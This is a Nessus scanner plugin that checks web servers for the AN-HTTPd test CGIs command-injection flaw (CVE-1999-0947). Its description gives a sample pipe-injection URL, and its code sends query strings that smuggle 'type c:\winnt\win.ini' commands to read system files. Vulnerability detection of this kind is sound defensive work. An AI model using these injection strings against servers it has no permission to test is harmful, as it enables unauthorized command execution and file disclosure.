#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10016);
 script_bugtraq_id(762);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-1999-0947");
 
 name["english"] = "AN-HTTPd tests CGIs";
 name["francais"] = "CGIs de tests livré avec AN-HTTPd";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
At least one of these CGIs is installed on the remote server :

	cgi-bin/test.bat
	cgi-bin/input.bat
	cgi-bin/input2.bat
	ssi/envout.bat
	
It is possible to misuse them to make the remote server

execute arbitrary commands.
For instance :
         http://www.xxx.yy/cgi-bin/input.bat?|dir..\..\windows
would show a complete directory listing of the remote system's 
private 'C:\windows\' directory.

Solution : Upgrade to the latest version of AN-HTTPd  
(http://www.st.rim.or.jp/~nakata/), or contact your vendor 
for a patch, or consider changing your HTTP server software.


Risk factor : High";


 desc["francais"] = "
Au moins un des CGIs suivant est installé :

	cgi-bin/test.bat
	cgi-bin/input.bat
	cgi-bin/input2.bat
	ssi/envout.bat
	
Il est possible de les utiliser de telle sorte qu'ils executent
des commandes arbitraires sur cette machine, comme :
		http://www.xxx.yy/cgi-bin/input.bat?|dir..\..\windows
		
Facteur de risque : elevé
Solution : installez la version 1.21 du produit, diponible à 
           http://www.st.rim.or.jp/~nakata/";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of several CGIs";
 summary["francais"] = "Vérifie la présence de certains CGIs";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

function check(item, exp)
{
 req = http_get(item:item, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 r = tolower(r);
 if(exp >< r)return(1);
 return(0);
}


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

cgi[0] = "/test.bat";
cgi[1] = "/input.bat";
cgi[2] = "/input2.bat";
cgi[3] = "/ssi/envout.bat";
cgi[4] = "";

for( i = 0 ; cgi[i] ; i = i + 1 )
{ 
 item = string(cgi[i], "?|type%20c:\\winnt\\win.ini");
 if(check(item:item, exp:"[fonts]")){
 	security_hole(port);
	exit(0);
	}
 item = string(cgi[i], "?|type%20c:\\windows\\win.ini");	
 if(check(item:item, exp:"[windows]")){
 	security_hole(port);
	exit(0);
	}
}
